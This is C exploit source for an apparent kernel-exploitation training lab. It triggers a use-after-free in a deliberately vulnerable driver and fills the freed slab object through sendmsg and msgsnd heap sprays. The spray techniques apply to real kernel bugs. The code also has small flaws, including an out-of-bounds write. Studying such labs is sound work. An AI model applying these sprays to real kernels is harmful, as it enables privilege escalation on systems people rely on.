#define _GNU_SOURCE
#include <sys/wait.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include "../vuln_driver.h"

#define PATH "/dev/vulnerable_device"
#define __NR_sendmmsg 307
#define BUFF_SIZE 96


typedef struct k_object
{
	char buff[BUFF_SIZE];
}k_object;

/**
* Here we are using the sendmsg syscall. This is a good
* one to use because the number of bytes allocated on the
* heap is determined by the user, this means we can determine
* which cache to use. The api is quite confusing and much of this
* was written after reading a lot of stackoverflow posts.
*/
void use_after_free_sendmsg(int fd)
{
	char buff[CMSG_SPACE(BUFF_SIZE)];
	struct cmsghdr *chdr;
	struct msghdr msg = {0};
	struct sockaddr_in addr = {0};
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(buff, 0x42, sizeof buff);

	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(6666);

	/* This is the data that will overwrite the vulnerable object in the heap */
        msg.msg_control = buff;

        msg.msg_controllen = sizeof buff;
        chdr = CMSG_FIRSTHDR(&msg);
        chdr->cmsg_level = SOL_SOCKET;
        chdr->cmsg_type = SCM_RIGHTS;
        chdr->cmsg_len = BUFF_SIZE;	//CMSG_LEN(sizeof buff);

	/* This is the user controlled size, eventually kmalloc(msg_controllen) will occur */
        msg.msg_controllen = BUFF_SIZE; // should be chdr->cmsg_len but i want to force the size

        msg.msg_name = (caddr_t)&addr;
        msg.msg_namelen = sizeof(addr);

	ioctl(fd, ALLOC_UAF_OBJ, NULL);
	ioctl(fd, FREE_UAF_OBJ, NULL);

	/* Heap spray */
	for(int i = 0; i < 100000; i++) {
               	sendmsg(sockfd, &msg, 0);
       	}

	/* Trigger */
	ioctl(fd, USE_UAF_OBJ, NULL);

}


/**
* Here we are using the msgsnd syscall. It will trigger a call to
* load_msg, and then alloc_msg in kernel space, where a kmalloc
* will eventually occur. 
* Note that the allocation is actually of a struct msg_msg, which
* is 48 bytes in size, we do not control the first 48 bytes of data.
* User controlled data follows immediately after the header info.
*/
int use_after_free_msgsnd(int fd)
{
	struct {
		long mtype;
		char mtext[BUFF_SIZE];
	}msg;


	memset(msg.mtext, 0x42, BUFF_SIZE-1);
	msg.mtext[BUFF_SIZE] = 0;

	/* Create the message queue we will be sending messages through */
	int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

	/* mtype must be > 0 */
	msg.mtype = 1;

	/* Allocate and free the vulnerable object, ready to be overwritten in the relevant cache */
	ioctl(fd, ALLOC_UAF_OBJ, NULL);
        ioctl(fd, FREE_UAF_OBJ, NULL);

	/* Spray the heap, the larger the msg, the smaller amount of messages we can send */
	for(int i = 0; i < 300; i++)
       		msgsnd(msqid, &msg, sizeof(msg.mtext), 0);


   	ioctl(fd, USE_UAF_OBJ, NULL);
}

int main(void)
{
	int fd = open(PATH, O_RDWR);

	/* Helps us differentiate calls in dmesg */
	ioctl(fd, DRIVER_TEST, NULL);


	use_after_free_sendmsg(fd);

//	use_after_free_msgsnd(fd);
}
